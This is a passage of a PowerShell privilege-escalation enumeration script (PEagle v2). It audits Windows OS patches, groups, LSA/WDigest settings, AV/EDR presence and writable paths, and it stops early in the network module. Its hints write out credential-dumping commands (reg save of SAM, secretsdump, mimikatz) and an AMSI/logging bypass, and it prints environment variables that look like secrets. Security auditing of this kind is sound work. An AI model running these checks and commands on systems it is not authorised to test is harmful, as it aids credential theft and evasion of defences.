<#
.SYNOPSIS
    PEagle v2 — Enumeracao completa de Windows para Privilege Escalation
    Autossuficiente: zero dependencias externas. Apenas PowerShell 5.1+.

.DESCRIPTION
    Script de enumeracao de privilege escalation para ambientes Windows.
    Cobre sistema, rede, servicos, credenciais, AD, ADCS (ESC1-ESC17), containers,
    checks modernos (tokens, pipes, UAC) e 18 CVEs criticos (2020-2026).

    MODULOS:
      System      — OS, usuarios, processos, AV/EDR, LSA, WDigest, software
      Network     — interfaces, rotas, portas abertas, shares, DNS, ARP
      Services    — servicos com paths graváveis, tasks agendadas, AlwaysInstallElevated
      Creds       — PS History, Credential Manager, DPAPI, SAM/SYSTEM, SSH keys,
                    tokens Teams/Slack/Outlook, cookies de browser, AWS/Git creds
      ADCS        — ESC1-ESC17 via LDAP DirectorySearcher
      AD          — Kerberoasting, ACL, delegacao, AdminSDHolder, contas privilegiadas
      Containers  — Docker, WSL2, Hyper-V, namespace escapes
      Modern      — Defender exclusoes, Token privileges, WMI subscriptions,
                    AppLocker, COM objects, Named Pipes, UAC, grupos privilegiados
      CVE         — 18 CVEs com validacao de OS build (SMBGhost, Zerologon,
                    PrintNightmare, noPac, Certifried, AFD.sys, CLFS EoP e outros)
      All         — Todos os modulos em sequencia (contadores unificados)

    PARAMETROS:
      -Module       System|Network|Services|Creds|AD|ADCS|Containers|Modern|CVE|All
      -OutputFile   Caminho para arquivo de saida
      -OutputFormat Text|Json|Csv  (Text = transcript, Json/Csv = findings estruturados)
      -Fast         Pula checks lentos (COM 300 amostras, enum completa de software)

    SAIDA JSON/CSV inclui: Severity, Section, Check, Message, Timestamp (ISO 8601)

    SEVERIDADES:
      [CRIT]  Exploracao imediata — privesc direto
      [HIGH]  Risco elevado — requer configuracao adicional
      [ MED]  Risco medio — aumenta superficie de ataque
      [ OK ]  Sem problema detectado
      [INFO]  Informacao relevante

.EXAMPLE
    # Scan completo
    powershell -ep bypass -File PEagle.ps1

    # Scan completo com export JSON
    powershell -ep bypass -File PEagle.ps1 -OutputFormat Json -OutputFile C:\out.json

    # Apenas CVEs (rapido)
    powershell -ep bypass -File PEagle.ps1 -Module CVE

    # Scan rapido sem checks lentos
    powershell -ep bypass -File PEagle.ps1 -Fast

    # Apenas ADCS
    powershell -ep bypass -File PEagle.ps1 -Module ADCS

    # Credenciais em CSV
    powershell -ep bypass -File PEagle.ps1 -Module Creds -OutputFormat Csv -OutputFile C:\creds.csv

.NOTES
    Versao  : 2.0
    Data    : 2026-11-22
    Requer  : PowerShell 5.1+ (PS7 recomendado)
    Privs   : Usuario comum (checks privilegiados sao pulados automaticamente)
    Lab     : docker run --rm peagle-lab  (132 testes, 0 falhas)
#>
param(
    [ValidateSet("All","System","Network","Services","Creds","AD","ADCS","Containers","Modern","CVE")]
    [string]$Module = "All",
    [string]$OutputFile = "",
    [ValidateSet("Text","Json","Csv")]
    [string]$OutputFormat = "Text",
    [switch]$Fast   # Pula checks lentos: COM 300 amostras, icacls full scan, software enum completa
)

Set-StrictMode -Off
$ErrorActionPreference = "SilentlyContinue"

if ($OutputFile -ne "" -and $OutputFormat -eq "Text") { Start-Transcript -Path $OutputFile -Force | Out-Null }

# Contadores globais para resumo executivo
$script:CountCrit = 0
$script:CountHigh = 0
$script:CountMed  = 0
# Findings estruturados para Json/Csv
$script:Findings    = [System.Collections.Generic.List[hashtable]]::new()
$script:_CurrSec    = ""
$script:_CurrSub    = ""
$script:_SecIdx     = 0
$script:_SubFindStart = 0   # CountCrit+High+Med no inicio de cada W-Sub

# ─── HELPERS ────────────────────────────────────────────────────────────────

function W-Banner {
    $W = 70
    $line = "=" * $W
    Write-Host ""
    Write-Host "  $line" -ForegroundColor DarkCyan
    Write-Host "                                                                      " -ForegroundColor DarkCyan
    Write-Host "        ___________                 ___      " -ForegroundColor Cyan
    Write-Host "       |  _ \  ____|     /\        | \ \     " -ForegroundColor Cyan
    Write-Host "       | |_) | |__      /  \       | |\ \    " -ForegroundColor Cyan
    Write-Host "       |  __/|  __|    / /\ \  _   | | > >   " -ForegroundColor Yellow
    Write-Host "       | |   | |____  / ____ \| |__| |/ /    " -ForegroundColor Yellow
    Write-Host "       |_|   |______||_/    \_\______/_/     " -ForegroundColor Red
    Write-Host "                                             " -ForegroundColor DarkCyan
    Write-Host ("  {0,-$W}" -f "  PEagle v2  |  Windows Privilege Escalation Enumeration") -ForegroundColor Cyan
    Write-Host "  $line" -ForegroundColor DarkCyan
    Write-Host ""

    try {
        $os  = Get-CimInstance Win32_OperatingSystem  -ErrorAction Stop
        $cs  = Get-CimInstance Win32_ComputerSystem   -ErrorAction Stop
        $cpu = (Get-CimInstance Win32_Processor -ErrorAction Stop | Select-Object -First 1).Name
        $ram = [math]::Round($cs.TotalPhysicalMemory/1GB,1)
        $domain = if ($cs.Domain -and $cs.Domain -ne $env:COMPUTERNAME) { $cs.Domain } else { "(workgroup)" }
        Write-Host ("  {0,-12} {1}  [{2}]" -f "HOST:",$env:COMPUTERNAME,$domain) -ForegroundColor White
        Write-Host ("  {0,-12} {1}" -f "OS:",$os.Caption) -ForegroundColor White
        Write-Host ("  {0,-12} {1}" -f "VERSAO:",$os.Version) -ForegroundColor White
        Write-Host ("  {0,-12} {1}" -f "CPU:",$cpu) -ForegroundColor White
        Write-Host ("  {0,-12} {1}GB   PS {2}" -f "RAM:",$ram,$PSVersionTable.PSVersion) -ForegroundColor White
    } catch {
        Write-Host ("  {0,-12} {1}" -f "HOST:",$env:COMPUTERNAME) -ForegroundColor White
    }
    Write-Host ("  {0,-12} {1}" -f "DATA:",(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ForegroundColor White
    Write-Host ("  {0,-12} {1}" -f "USUARIO:",$env:USERNAME) -ForegroundColor White
    Write-Host ""

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $isSystem = $env:USERNAME -eq "SYSTEM" -or $env:USERNAME -ceq "NT AUTHORITY\SYSTEM" -or [bool]([Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
    if ($isSystem) {
        Write-Host "  [ PRIVILEGIO ]  SYSTEM  —  acesso total garantido" -ForegroundColor Cyan
    } elseif ($isAdmin) {
        Write-Host "  [ PRIVILEGIO ]  ADMINISTRADOR  —  maioria dos checks disponiveis" -ForegroundColor Green
    } else {
        Write-Host "  [ PRIVILEGIO ]  USUARIO COMUM  —  checks privilegiados serao pulados" -ForegroundColor Yellow
        Write-Host "  [ DICA       ]  Tente: RunAs /user:Administrator  |  Potato / Token abuse" -ForegroundColor DarkYellow
    }
    Write-Host ""
    Write-Host "  $line" -ForegroundColor DarkCyan
    Write-Host ""
}

function W-SubFlush {
    # Exibe contagem do sub atual se houver findings — chamar antes de cada novo sub e ao fim do modulo
    if ($script:_CurrSub -ne "") {
        $found = ($script:CountCrit + $script:CountHigh + $script:CountMed) - $script:_SubFindStart
        if ($found -gt 0) {
            Write-Host ("   ^^ {0} finding(s) acima" -f $found) -ForegroundColor DarkGray
        }
    }
}

function W-Sec {
    param([string]$Title)
    W-SubFlush
    $script:_CurrSec    = $Title
    $script:_CurrSub    = ""
    $script:_SecIdx++
    $W = 70; $line = "-" * $W
    Write-Host ""
    Write-Host ""
    Write-Host "  $line" -ForegroundColor DarkCyan
    Write-Host ("  [{0}]  {1}" -f $script:_SecIdx, $Title) -ForegroundColor Cyan
    Write-Host "  $line" -ForegroundColor DarkCyan
}

function W-Sub {
    param([string]$Title)
    W-SubFlush
    $script:_CurrSub      = $Title
    $script:_SubFindStart = $script:CountCrit + $script:CountHigh + $script:CountMed
    Write-Host ""
    Write-Host ("  >> {0}" -f $Title) -ForegroundColor Blue
}

function W-Crit {
    param([string]$msg)
    $script:CountCrit++
    $script:Findings.Add(@{ Severity="CRITICAL"; Section=$script:_CurrSec; Check=$script:_CurrSub; Message=$msg; Timestamp=(Get-Date -Format 'o') })
    Write-Host ("  [CRIT] {0}" -f $msg) -ForegroundColor Red
}
function W-High {
    param([string]$msg)
    $script:CountHigh++
    $script:Findings.Add(@{ Severity="HIGH"; Section=$script:_CurrSec; Check=$script:_CurrSub; Message=$msg; Timestamp=(Get-Date -Format 'o') })
    Write-Host ("  [HIGH] {0}" -f $msg) -ForegroundColor Yellow
}
function W-Med {
    param([string]$msg)
    $script:CountMed++
    $script:Findings.Add(@{ Severity="MEDIUM"; Section=$script:_CurrSec; Check=$script:_CurrSub; Message=$msg; Timestamp=(Get-Date -Format 'o') })
    Write-Host ("  [ MED] {0}" -f $msg) -ForegroundColor Magenta
}
function W-Ok   { param([string]$msg) Write-Host ("  [  OK] {0}" -f $msg) -ForegroundColor DarkGreen }
function W-Info { param([string]$msg) Write-Host ("  [INFO] {0}" -f $msg) -ForegroundColor Gray }
function W-Data { param([string]$msg) $t = if ($msg.Length -gt 120) { $msg.Substring(0,117) + "..." } else { $msg }; Write-Host ("         {0}" -f $t) -ForegroundColor DarkGray }
function W-Hint { param([string]$msg) Write-Host ("         >> {0}" -f $msg) -ForegroundColor DarkRed }

function Find-WritablePath {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return $false }
    # Preferir icacls: reflete token do usuario atual (grupos transitivos incluidos)
    try {
        $r = icacls $Path 2>$null | Out-String
        if ($r -match "BUILTIN\\Users[^)]*[:(][^)]*[WMF]" -or
            $r -match "Everyone[^)]*[:(][^)]*[WMF]" -or
            $r -match "Authenticated Users[^)]*[:(][^)]*[WMF]") { return $true }
    } catch {}
    # Fallback: Get-Acl (menos preciso — ignora negacoes e heranca denegada)
    try {
        $acl = Get-Acl $Path -ErrorAction Stop
        foreach ($ace in $acl.Access) {
            if ($ace.IdentityReference -match "Users|Everyone|Authenticated Users|BUILTIN\\Users" -and
                $ace.FileSystemRights  -match "Write|FullControl|Modify") { return $true }
        }
    } catch {}
    return $false
}

function Get-UserProfiles {
    # Enumera perfis via registry (mais completo que listar C:\Users)
    $profiles = [System.Collections.Generic.List[object]]::new()
    try {
        Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" -ErrorAction Stop | ForEach-Object {
            $img = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).ProfileImagePath
            if ($img -and (Test-Path $img -ErrorAction SilentlyContinue)) {
                $profiles.Add([PSCustomObject]@{ FullName=$img; Name=(Split-Path $img -Leaf) })
            }
        }
    } catch {}
    if ($profiles.Count -eq 0) {
        Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles.Add($_) }
    }
    return $profiles
}

function Test-Admin  { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }
function Test-Domain { try { (Get-CimInstance Win32_ComputerSystem).PartOfDomain } catch { $false } }

# ─── MODULO: SISTEMA ────────────────────────────────────────────────────────

function Invoke-SystemChecks {
    W-Sec "SISTEMA — Informacoes basicas"

    W-Sub "Informacoes do OS"
    try {
        $os  = Get-CimInstance Win32_OperatingSystem
        $cs  = Get-CimInstance Win32_ComputerSystem
        W-Info "OS        : $($os.Caption) Build $($os.BuildNumber)"
        W-Info "Versao    : $($os.Version)"
        W-Info "Arquit.   : $($os.OSArchitecture)"
        W-Info "Dominio   : $($cs.Domain)"
        W-Info "Modelo    : $($cs.Manufacturer) $($cs.Model)"
        $bootTime = if ($os.LastBootUpTime -is [datetime]) { $os.LastBootUpTime } else { [System.Management.ManagementDateTimeConverter]::ToDateTime($os.LastBootUpTime) }
        $ts = [datetime]::Now - $bootTime
        W-Info "Uptime    : $($ts.Days)d $($ts.Hours.ToString('00')):$($ts.Minutes.ToString('00')):$($ts.Seconds.ToString('00'))"

        # KB ausente para vulns conhecidas (ignora build 0 — mock/erro de leitura)
        $build = [int]($os.BuildNumber)
        if ($build -gt 0 -and $build -lt 19041) {
            W-High "Build $build — Windows < 20H1. Verificar EternalBlue (MS17-010), PrintNightmare, HiveNightmare"
        }
    } catch { W-Info "Erro info OS: $_" }

    W-Sub "Hotfixes instalados (ultimos 15)"
    try {
        $allHf = Get-HotFix
        $hf    = $allHf | Sort-Object { try { [datetime]$_.InstalledOn } catch { [datetime]::MinValue } } -Descending | Select-Object -First 15
        $hf | ForEach-Object { W-Data "$($_.HotFixID)  $($_.Description)  $($_.InstalledOn)" }

        # HiveNightmare — busca no conjunto COMPLETO de KBs, nao apenas nos 15 recentes
        $os = Get-CimInstance Win32_OperatingSystem
        if ([int]$os.BuildNumber -ge 19041) {
            $kbHive = $allHf | Where-Object { $_.HotFixID -match "KB5004605|KB5003791|KB5004946|KB5004237" }
            if (-not $kbHive) {
                W-High "HiveNightmare (CVE-2021-36934): patch nao detectado — SAM/SYSTEM podem estar legiveis via VSS"
            }
        }
    } catch { W-Info "Erro hotfixes: $_" }

    W-Sub "Variaveis de ambiente sensiveis"
    @("PATH","TEMP","TMP","APPDATA","LOCALAPPDATA","USERPROFILE","COMPUTERNAME","USERNAME","USERDOMAIN") |
        ForEach-Object { W-Data "${_} = $(([System.Environment]::GetEnvironmentVariable($_)))" }

    # Procurar senhas em variaveis de ambiente
    Get-ChildItem Env: | Where-Object {
        $_.Name  -match "(?i)(^pass$|password|passwd|^pwd$|secret|token|apikey|api_key|_key$|_secret$)" -or
        $_.Value -match "(?i)(password|secret)\s*="
    } | ForEach-Object { W-High "Env var suspeita: $($_.Name) = $($_.Value)" }

    W-Sub "Usuarios locais"
    try {
        $adminMembers = @(Get-LocalGroupMember "Administrators" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
        Get-LocalUser | ForEach-Object {
            $userName = $_.Name
            $adm    = $adminMembers | Where-Object { $_ -match [regex]::Escape($userName) }
            $status = if ($_.Enabled) { "Ativo" } else { "Desabilitado" }
            $flag   = if ($_.PasswordNeverExpires) { " [SenhaNoExpira]" } else { "" }
            $admTag = if ($adm) { " [ADMIN]" } else { "" }
            W-Data "$userName | $status$admTag$flag | LastLogon: $($_.LastLogon)"
        }
    } catch { W-Info "Erro usuarios: $_" }

    W-Sub "Grupos locais e membros relevantes"
    @("Administrators","Remote Desktop Users","Remote Management Users","Backup Operators","Event Log Readers","DnsAdmins") |
    ForEach-Object {
        $g = $_
        try {
            $members = Get-LocalGroupMember $g -ErrorAction Stop
            if ($members) {
                W-High "Grupo '$g':"
                $members | ForEach-Object { W-Data "$($_.Name) [$($_.ObjectClass)]" }
            }
        } catch {}
    }

    W-Sub "Drives e volumes"
    try {
        Get-PSDrive -PSProvider FileSystem | ForEach-Object {
            W-Data "$($_.Name): | Root: $($_.Root) | Livre: $([math]::Round($_.Free/1GB,1))GB | Total: $([math]::Round(($_.Used+$_.Free)/1GB,1))GB"
        }
        # Shadow copies (util para HiveNightmare / leitura de SAM)
        $vss = @(Get-CimInstance Win32_ShadowCopy -ErrorAction SilentlyContinue)
        if ($vss.Count -gt 0) {
            W-High "$($vss.Count) Shadow Copies encontradas — podem conter SAM/NTDS.dit legivel:"
            $vss | Select-Object -First 5 | ForEach-Object { W-Data "$($_.ID) | $($_.InstallDate)" }
        }
    } catch { W-Info "Erro drives: $_" }

    W-Sub "HiveNightmare — SAM legivel via Shadow Copy"
    try {
        $acl = Get-Acl "C:\Windows\System32\config\SAM"
        foreach ($r in $acl.Access) {
            if ($r.IdentityReference -match "Users|Everyone|Authenticated" -and
                $r.FileSystemRights -match "Read|FullControl") {
                W-Crit "SAM legivel por $($r.IdentityReference)! CVE-2021-36934 (HiveNightmare)"
                W-Data "reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\sys.hive"
                W-Data "impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
            }
        }
    } catch { W-Ok "SAM nao legivel diretamente" }

    W-Sub "Processos em execucao"
    try {
        $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 30
        $procs | ForEach-Object {
            $path = try { $_.MainModule.FileName } catch { "N/A" }
            W-Data "$($_.Id.ToString().PadLeft(6))  $($_.ProcessName.PadRight(25)) $path"
        }
        # Processos de AV/EDR
        $av = @("MsMpEng","bdagent","ekrn","avp","mbam","SentinelAgent","CylanceSvc","cb","CarbonBlack","CSFalconService","CSFalconContainer","falcon-sensor","CrowdStrike")
        $detectedAV = Get-Process | Where-Object { $av -contains $_.ProcessName }
        if ($detectedAV) {
            W-Med "AV/EDR detectado(s): $($detectedAV.ProcessName -join ', ')"
        }
    } catch { W-Info "Erro processos: $_" }

    W-Sub "Registro — AutoRun e persistencia"
    $runKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
    )
    foreach ($key in $runKeys) {
        try {
            $vals = Get-ItemProperty $key -ErrorAction Stop
            $vals.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
                W-Info "AutoRun [$key]: $($_.Name) = $($_.Value)"
                # Extrair path do executavel: remover aspas e pegar primeira palavra
                $rawVal = $_.Value -replace '"', ''
                $exePath = ($rawVal -split '\s+')[0]
                if ($exePath -and $exePath -match '\.' -and (Find-WritablePath $exePath)) {
                    W-High "  -> binario gravavel: $($_.Value)"
                }
            }
        } catch {}
    }

    W-Sub "Politicas de auditoria (AuditPol)"
    try {
        $audit = auditpol /get /category:* 2>&1
        $audit | Where-Object { $_ -match "No Auditing" } | ForEach-Object {
            W-Med "Auditoria desativada: $($_.Trim())"
        }
        $audit | Where-Object { $_ -match "Success and Failure|Failure" -and $_ -match "Logon|Account|Privilege" } |
            ForEach-Object { W-Ok "Auditoria ativa: $($_.Trim())" }
    } catch { W-Info "Erro auditpol: $_" }

    W-Sub "Windows Event Forwarding (WEF)"
    try {
        $wef = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager" -ErrorAction Stop
        if ($wef) {
            W-Med "WEF ativo — logs sendo enviados para servidor externo:"
            $wef.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } |
                ForEach-Object { W-Data "$($_.Name) = $($_.Value)" }
        }
    } catch { W-Ok "WEF nao configurado" }

    W-Sub "LSA Protection (RunAsPPL)"
    try {
        $ppl = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL").RunAsPPL
        if ($ppl -eq 1) { W-Ok "LSA RunAsPPL=1 — LSASS protegido (dump direto bloqueado)" }
        else            { W-High "LSA RunAsPPL=$ppl — LSASS NAO protegido (mimikatz sekurlsa::logonpasswords funciona)" }
    } catch { W-High "LSA RunAsPPL: nao definido — LSASS provavelmente vulneravel a dump" }

    W-Sub "Credential Guard"
    try {
        $cg    = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction Stop).LsaCfgFlags
        $cgHv  = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
        # VBSStatus: 0=Off, 1=Configured(nao rodando), 2=Running — apenas 2 significa protecao real
        $vbsStatus = try { (Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root/Microsoft/Windows/DeviceGuard -ErrorAction Stop).VirtualizationBasedSecurityStatus } catch { $null }
        $vbsRunning = ($vbsStatus -eq 2)
        if ($cg -ge 1 -and $vbsRunning) {
            W-Ok "Credential Guard ativo e VBS rodando (LsaCfgFlags=$cg, VBSStatus=$vbsStatus)"
        } elseif ($cg -ge 1 -and -not $vbsRunning) {
            W-Med "Credential Guard configurado mas VBS NAO esta rodando (LsaCfgFlags=$cg, VBSStatus=$vbsStatus) — sem protecao real"
        } else {
            W-Med "Credential Guard inativo — NTLM hashes expostos no LSASS"
        }
        W-Data "EnableVBS=$cgHv | VBSStatus=$vbsStatus (0=Off, 1=Configurado, 2=Rodando)"
    } catch { W-Med "Credential Guard: nao configurado" }

    W-Sub "WDigest — senhas em texto claro no LSASS"
    try {
        $wd = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential").UseLogonCredential
        if ($wd -eq 1) { W-Crit "WDigest UseLogonCredential=1 — senhas em TEXTO CLARO no LSASS! (mimikatz sekurlsa::wdigest)" }
        else           { W-Ok "WDigest desabilitado (UseLogonCredential=$wd)" }
    } catch { W-Ok "WDigest: UseLogonCredential nao definido (default=desabilitado em Win8+)" }

    W-Sub "Cached Domain Credentials (DCC2)"
    try {
        $cached = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount").CachedLogonsCount
        if ([int]$cached -gt 0) {
            W-Med "CachedLogonsCount=$cached — $cached hash(es) DCC2 cached em HKLM\SECURITY\Cache (requer SYSTEM)"
            W-Data "Extrair: mimikatz lsadump::cache ou impacket-secretsdump -hashes ... LOCAL"
        } else { W-Ok "CachedLogonsCount=0 — sem hashes em cache" }
    } catch { W-Med "Cached creds: nao foi possivel verificar" }

    W-Sub "AV/EDR instalado"
    try {
        $avs = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction Stop
        if ($avs) {
            $avs | ForEach-Object {
                $stateInt    = [int]$_.productState
                $rtByte      = ($stateInt -shr 12) -band 0xF
                $defByte     = ($stateInt -shr 4)  -band 0xF
                $rtActive    = $rtByte -ne 0
                $defUpToDate = $defByte -eq 0
                $rtStr  = if ($rtActive)    { "RealTime:ATIVO"    } else { "RealTime:INATIVO" }
                $defStr = if ($defUpToDate) { "Defs:ATUALIZADO"   } else { "Defs:DESATUALIZADO" }
                $sev    = if (-not $rtActive) { "HIGH" } else { "INFO" }
                if ($sev -eq "HIGH") { W-High "AV: $($_.displayName) | $rtStr | $defStr (state=0x$($stateInt.ToString('X')))" }
                else                 { W-Info  "AV: $($_.displayName) | $rtStr | $defStr" }
            }
        } else { W-Med "Nenhum AV detectado via WMI SecurityCenter2" }
    } catch { W-Info "Erro AV WMI: $_" }

    # Deteccao de EDR por processo e servico
    W-Sub "EDR/EPP — deteccao por processo e servico"
    $edrSignatures = @(
        @{ Name="Windows Defender";      Procs=@("MsMpEng","NisSrv","SecurityHealthService") },
        @{ Name="CrowdStrike Falcon";    Procs=@("CSFalconService","CSFalconContainer","falcon-sensor","csagent") },
        @{ Name="SentinelOne";           Procs=@("SentinelAgent","SentinelServiceHost","sentinelagent") },
        @{ Name="Carbon Black";          Procs=@("cb","cbdefense","CbDefense","CarbonBlack") },
        @{ Name="Cylance";               Procs=@("CylanceSvc","CylanceUI","cylancesvc") },
        @{ Name="Elastic EDR";           Procs=@("elastic-agent","elastic-endpoint") },
        @{ Name="Tanium";                Procs=@("TaniumClient","TaniumCX") },
        @{ Name="Cybereason";            Procs=@("CybereasonAV","minionhost","CrAmTray") },
        @{ Name="Palo Alto Cortex XDR";  Procs=@("cyserver","cytray","CyveraService") },
        @{ Name="Sophos";                Procs=@("SophosAV","SophosUI","swi_service") },
        @{ Name="Symantec/Broadcom SEP"; Procs=@("Smc","ccSvcHst","SmcGui") },
        @{ Name="McAfee/Trellix";        Procs=@("McShield","mfefire","masvc","macmnsvc") },
        @{ Name="Kaspersky";             Procs=@("avp","avpui","klnagent") },
        @{ Name="ESET";                  Procs=@("ekrn","egui","eguiProxy") },
        @{ Name="Trend Micro";           Procs=@("PccNTMon","TmListen","ntrtscan") },
        @{ Name="Bitdefender";           Procs=@("bdagent","vsserv","bdredline") },
        @{ Name="F-Secure/WithSecure";   Procs=@("fsgk32st","fsavgui","WithSecure") },
        @{ Name="Malwarebytes";          Procs=@("MBAMService","mbamgui","MbamPt") }
    )
    $runningProcs = (Get-Process -ErrorAction SilentlyContinue).ProcessName
    $detectedAny  = $false
    foreach ($edr in $edrSignatures) {
        $hit = $edr.Procs | Where-Object { $runningProcs -contains $_ }
        if ($hit) {
            W-Info "EDR detectado: $($edr.Name) [processos: $($hit -join ', ')]"
            $detectedAny = $true
        }
    }
    if (-not $detectedAny) { W-High "Nenhum EDR/AV detectado por processo — ambiente potencialmente desprotegido!" }

    W-Sub "PowerShell — versao, logging e CLM"
    try {
        # PS v2 disponivel = bypass de logging/AMSI
        $ps2 = Get-WindowsOptionalFeature -Online -FeatureName "MicrosoftWindowsPowerShellV2" -ErrorAction SilentlyContinue
        if ($ps2 -and $ps2.State -eq "Enabled") {
            W-High "PowerShell v2 instalado — pode ser usado para bypass de AMSI/ScriptBlock Logging"
            W-Data "powershell -Version 2 -Command <cmd>"
        }
        # Script Block Logging
        $sbl = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging").EnableScriptBlockLogging
        if ($sbl -eq 1) { W-Med "ScriptBlock Logging ativo — comandos PS sendo logados em Event ID 4104" }
        else            { W-Ok "ScriptBlock Logging desabilitado" }
        # Constrained Language Mode
        $clm = $ExecutionContext.SessionState.LanguageMode
        if ($clm -eq "ConstrainedLanguage") { W-Med "ConstrainedLanguage Mode ativo — operacoes PS limitadas" }
        else                                { W-Ok "LanguageMode: $clm" }
    } catch { W-Info "Erro PS settings: $_" }

    W-Sub "Discos e volumes montados"
    try {
        Get-Volume -ErrorAction Stop | Where-Object { $_.DriveLetter } | ForEach-Object {
            $free = [math]::Round($_.SizeRemaining/1GB,1)
            $tot  = [math]::Round($_.Size/1GB,1)
            W-Data "$($_.DriveLetter): | $($_.FileSystemLabel) | $($_.FileSystem) | Livre: ${free}GB / ${tot}GB | $($_.HealthStatus)"
        }
        # Discos removiveis/USB
        Get-CimInstance Win32_DiskDrive | Where-Object { $_.MediaType -match "Removable|External" } |
            ForEach-Object { W-Med "Disco removivel: $($_.Caption) ($([math]::Round($_.Size/1GB,1))GB)" }
    } catch { W-Info "Erro volumes: $_" }

    W-Sub "Tabela ARP — hosts ativos na rede local"
    try {
        $arp = Get-NetNeighbor -ErrorAction Stop | Where-Object { $_.State -ne "Unreachable" -and $_.IPAddress -notmatch "^ff|^224|^::1|^fe80" }
        $arp | ForEach-Object { W-Data "$($_.IPAddress.PadRight(20)) $($_.LinkLayerAddress.PadRight(20)) $($_.State)" }
    } catch { arp -a 2>&1 | ForEach-Object { W-Data $_ } }

    W-Sub "Software instalado (potencialmente vulneravel)"
    # Tabela de versoes conhecidamente vulneraveis: nome (regex) => versao_maxima_vulneravel, CVE/desc
    $vulnSoftware = @(
        @{ Pattern="OpenSSH.*Windows"; MaxVer=[version]"9.5.0.0"; Desc="CVE-2023-48795 (Terrapin) — upgrade para 9.6+" },
        @{ Pattern="PuTTY";            MaxVer=[version]"0.80.0.0"; Desc="CVE-2024-31497 (ECDSA key leak) — upgrade para 0.81+" },
        @{ Pattern="Notepad\+\+";      MaxVer=[version]"8.6.1.0";  Desc="CVE-2023-40031 (buffer overflow) — upgrade para 8.6.2+" },
        @{ Pattern="7-Zip";            MaxVer=[version]"23.1.0.0";  Desc="CVE-2023-31102 (heap overflow) — upgrade para 23.01+" },
        @{ Pattern="WinRAR";           MaxVer=[version]"6.22.0.0";  Desc="CVE-2023-38831 (RCE via archive) — upgrade para 6.23+" },
        @{ Pattern="Git.*Windows";     MaxVer=[version]"2.42.0.0";  Desc="CVE-2023-29007 (config injection) — upgrade para 2.42.0+" }
    )
    try {
        $regPaths = @(
            "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
        )
        $seen = @{}
        $allSoftware = @()
        foreach ($rp in $regPaths) {
            Get-ItemProperty $rp -ErrorAction SilentlyContinue |
                Where-Object { $_.DisplayName -and -not $seen[$_.DisplayName] } |
                ForEach-Object {
                    $seen[$_.DisplayName] = $true
                    $allSoftware += $_
                    if (-not $Fast) { W-Data "$($_.DisplayName) v$($_.DisplayVersion) [$($_.Publisher)]" }
                }
        }
        # Verificar versoes vulneraveis
        foreach ($vs in $vulnSoftware) {
            $match = $allSoftware | Where-Object { $_.DisplayName -match $vs.Pattern -and $_.DisplayVersion }
            foreach ($m in $match) {
                try {
                    $instVer = [version]($m.DisplayVersion -replace '[^0-9.]','')
                    if ($instVer -le $vs.MaxVer) {
                        W-High "Software vulneravel: $($m.DisplayName) v$($m.DisplayVersion) — $($vs.Desc)"
                    }
                } catch {}
            }
        }
        if ($Fast) { W-Info "Lista completa de software omitida (-Fast ativo) — $($allSoftware.Count) itens encontrados" }
    } catch { W-Info "Erro ao enumerar software: $_" }

    W-Sub "Pastas graváveis em locais sensiveis"
    $sensitivePaths = @(
        "C:\Windows", "C:\Windows\System32", "C:\Windows\SysWOW64",
        "C:\Program Files", "C:\Program Files (x86)",
        "C:\ProgramData", "C:\Temp", "C:\Windows\Temp"
    )
    foreach ($p in $sensitivePaths) {
        if ((Test-Path $p) -and (Find-WritablePath $p)) {
            W-High "Pasta gravavel: $p"
        }
    }
}

# ─── MODULO: REDE ────────────────────────────────────────────────────────────

function Invoke-NetworkChecks {
    W-Sec "REDE — Interfaces, Conexoes e Firewall"

    W-Sub "Interfaces de rede"
    try {
